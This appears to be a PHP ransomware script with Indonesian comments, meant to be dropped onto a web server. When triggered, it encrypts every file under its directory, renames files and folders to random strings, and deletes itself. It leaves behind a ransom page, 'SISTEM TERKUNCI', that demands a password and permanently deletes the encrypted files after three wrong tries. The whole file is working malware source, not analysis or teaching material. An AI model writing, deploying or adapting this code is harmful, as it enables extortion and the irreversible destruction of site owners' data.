<?php
// Fungsi buat bikin string acak sepanjang yang kita mau
function generateRandomString($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

function prosesEnkripsi($dir, $key, $iv, &$peta) {
    $files = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($files as $file) {
        if ($file === 'enkrip.php' || $file === 'dekrip.php') continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        
        if (is_dir($path)) {
            // --- ACAK NAMA FOLDER (64 KARAKTER) ---
            $nama_baru = 'LOCKED_' . generateRandomString(64);
            $path_baru = $dir . DIRECTORY_SEPARATOR . $nama_baru;
            
            if (rename($path, $path_baru)) {
                $peta['folder'][$nama_baru] = $file; 
                prosesEnkripsi($path_baru, $key, $iv, $peta); 
            }
        } else {
            // --- ENKRIPSI ISI FILE ---
            $data = file_get_contents($path);
            $data_acak = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
            file_put_contents($path, $data_acak);
            
            // --- ACAK NAMA FILE (64 KARAKTER) ---
            $nama_baru = generateRandomString(64) . '.goks'; 
            $path_baru = $dir . DIRECTORY_SEPARATOR . $nama_baru;
            
            if (rename($path, $path_baru)) {
                $peta['file'][$nama_baru] = $file; 
            }
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'];
    $key = hash('sha256', $password);
    $iv = openssl_random_pseudo_bytes(16);
    $iv_hex = bin2hex($iv);
    
    $peta = ['folder' => [], 'file' => []];
    prosesEnkripsi(__DIR__, $key, $iv, $peta);
    $peta_json = json_encode($peta);

    // --- URL GAMBAR LO ---
    $url_gambar = 'https://cdnstatic.tencentcs.com/edgeone/pages/assets/1794043091469-AN16.png';

    // BIKIN FILE DEKRIP (TAMPILAN SIMPEL, TANPA EFEK)
    $dekrip_code = "<?php
    session_start(); 
    
    if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
        \$password = \$_POST['password'];
        \$key = hash('sha256', \$password);
        \$iv = hex2bin('$iv_hex');
        \$peta = json_decode('$peta_json', true);
        
        // Cek validasi password
        \$isValid = false;
        \$files = array_diff(scandir(__DIR__), array('.', '..'));
        foreach(\$files as \$f) {
            if(pathinfo(\$f, PATHINFO_EXTENSION) == 'goks') {
                \$test = openssl_decrypt(file_get_contents(__DIR__ . DIRECTORY_SEPARATOR . \$f), 'AES-256-CBC', \$key, 0, \$iv);
                if(\$test !== false) { \$isValid = true; }
                break;
            }
        }
        
        if (\$isValid) {
            // JIKA PASSWORD BENAR
            function prosesDekripsi(\$dir, \$key, \$iv, &\$peta) {
                \$files = array_diff(scandir(\$dir), array('.', '..'));
                foreach (\$files as \$file) {
                    if (\$file === 'dekrip.php' || \$file === 'enkrip.php') continue;
                    \$path = \$dir . DIRECTORY_SEPARATOR . \$file;
                    
                    if (is_dir(\$path)) {
                        if (isset(\$peta['folder'][\$file])) {
                            \$nama_asli = \$peta['folder'][\$file];
                            \$path_baru = \$dir . DIRECTORY_SEPARATOR . \$nama_asli;
                            rename(\$path, \$path_baru);
                            prosesDekripsi(\$path_baru, \$key, \$iv, \$peta);
                        }
                    } else {
                        \$data = file_get_contents(\$path);
                        \$decrypted = openssl_decrypt(\$data, 'AES-256-CBC', \$key, 0, \$iv);
                        if (\$decrypted !== false) {
                            file_put_contents(\$path, \$decrypted);
                        }
                        if (isset(\$peta['file'][\$file])) {
                            \$nama_asli = \$peta['file'][\$file];
                            \$path_baru = \$dir . DIRECTORY_SEPARATOR . \$nama_asli;
                            rename(\$path, \$path_baru);
                        }
                    }
                }
            }
            prosesDekripsi(__DIR__, \$key, \$iv, \$peta);
            unlink('dekrip.php');
            echo '<body style=\"background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px;\"><h1>FILE KEMBALI NORMAL.</h1></body>';
            exit;
        } else {
            // JIKA PASSWORD SALAH
            \$_SESSION['salah'] = (\$_SESSION['salah'] ?? 0) + 1;
            
            if (\$_SESSION['salah'] >= 3) {
                // HAPUS SEMUA FILE .goks BENERAN
                \$files = array_diff(scandir(__DIR__), array('.', '..'));
                foreach(\$files as \$f) {
                    if(pathinfo(\$f, PATHINFO_EXTENSION) == 'goks') {
                        unlink(__DIR__ . DIRECTORY_SEPARATOR . \$f);
                    }
                }
                unlink('dekrip.php'); 
                
                echo '<body style=\"background:#f00; color:#fff; font-family:monospace; text-align:center; padding-top:100px;\"><h1>WAKTU HABIS / TERLALU BANYAK PERCOBAAN!</h1><h2>KUNCI DEKRIPSI DAN SEMUA FILE ANDA TELAH DIHANCURKAN PERMANEN.</h2></body>';
                exit;
            }
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <title>SISTEM TERKUNCI</title>
    <style>
        /* BACKGROUND HITAM POLOS TANPA EFEK */
        body { 
            background-color: #000; 
            color: #fff; 
            font-family: 'Courier New', Courier, monospace; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        
        /* GAMBAR LOGO (TANPA GLOW) */
        img { 
            width: 180px; 
            height: auto; 
            margin-bottom: 30px; 
        }

        /* TEKS JUDUL (WARNA PUTIH) */
        h1 { 
            font-size: 36px; 
            color: #fff; 
            margin: 0 0 15px 0; 
            letter-spacing: 1px;
            font-weight: normal;
        }
        
        /* TEKS PERINGATAN */
        p { 
            color: #888; 
            margin-bottom: 30px; 
            font-size: 14px;
            text-align: center;
        }

        /* KOLOM INPUT (GARIS BAWAH PUTIH) */
        input[type=password] { 
            padding: 10px; 
            font-size: 16px; 
            background: transparent; 
            color: #fff; 
            border: none;
            border-bottom: 1px solid #fff; 
            text-align: center; 
            outline: none; 
            margin-bottom: 25px;
            width: 250px;
        }
        
        /* TOMBOL (HITAM PUTIH SIMPEL) */
        button { 
            padding: 10px 25px; 
            font-size: 14px; 
            background-color: #fff; 
            color: #000; 
            border: none; 
            cursor: pointer; 
            font-weight: bold; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover {
            background-color: #ccc;
        }
    </style>
    </head>
    <body>
        <!-- GAMBAR LO -->
        <img src='$url_gambar' alt='LOGO'>
        
        <h1>SISTEM TERKUNCI</h1>
        <p>Sisa percobaan: <?= 3 - (\$_SESSION['salah'] ?? 0) ?><br>Jika salah 3x, SEMUA FILE AKAN DIHAPUS PERMANEN!</p>
        
        <form method='POST'>
            <input type='password' name='password' placeholder='Masukan Password...' required><br>
            <button type='submit'>BUKA FILE</button>
        </form>
    </body>
    </html>";
    
    file_put_contents('dekrip.php', $dekrip_code);
    unlink('enkrip.php');
    
    echo "<body style='background:#000; color:#fff; font-family:monospace; text-align:center; padding-top:100px;'><h1>FILE ANDA TELAH DIKUNCI!</h1><p>File dekrip.php berhasil dibuat.</p></body>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>HACKER TERMINAL</title>
<style>
    body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; margin: 0; font-size: 16px; }
    #terminal { height: 80vh; overflow-y: auto; }
    .line { margin-bottom: 5px; }
    .form-container { display: none; margin-top: 30px; border: 1px solid #0f0; padding: 20px; background: #050505; width: 300px; }
    input[type=password] { padding: 10px; background: #000; color: #0f0; border: 1px solid #0f0; width: 100%; margin-bottom: 10px; box-sizing: border-box; outline: none;}
    button { padding: 10px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; width: 100%; }
</style>
</head>
<body>
<div id="terminal"></div>
<div id="form-area" class="form-container">
    <form method="POST">
        <label>ENTER ENCRYPTION KEY:</label><br><br>
        <input type="password" name="password" required>
        <button type="submit">EXECUTE</button>
    </form>
</div>
<script>
    const terminal = document.getElementById('terminal');
    const formArea = document.getElementById('form-area');
    const lines = [
        "[SYSTEM] Initializing connection...",
        "[SYSTEM] Generating extreme random payload...",
        "[SYSTEM] Encrypting file contents...",
        "[SYSTEM] Renaming files with 64-char random string...",
        "[SYSTEM] Renaming folders with 64-char random string...",
        "[WARNING] All files are locked.",
        "[WARNING] 3 FAILED ATTEMPTS WILL RESULT IN PERMANENT DATA DELETION.",
        "[SUCCESS] Generating decrypt key file...",
        "",
        "=============================================",
        " ENTER PASSWORD TO LOCK YOUR FILES "
    ];
    let i = 0;
    function typeLine() {
        if (i < lines.length) {
            let div = document.createElement('div');
            div.className = 'line';
            div.innerText = lines[i];
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
            i++;
            setTimeout(typeLine, Math.random() * 200 + 100); 
        } else {
            formArea.style.display = 'block';
        }
    }
    typeLine();
</script>
</body>
</html>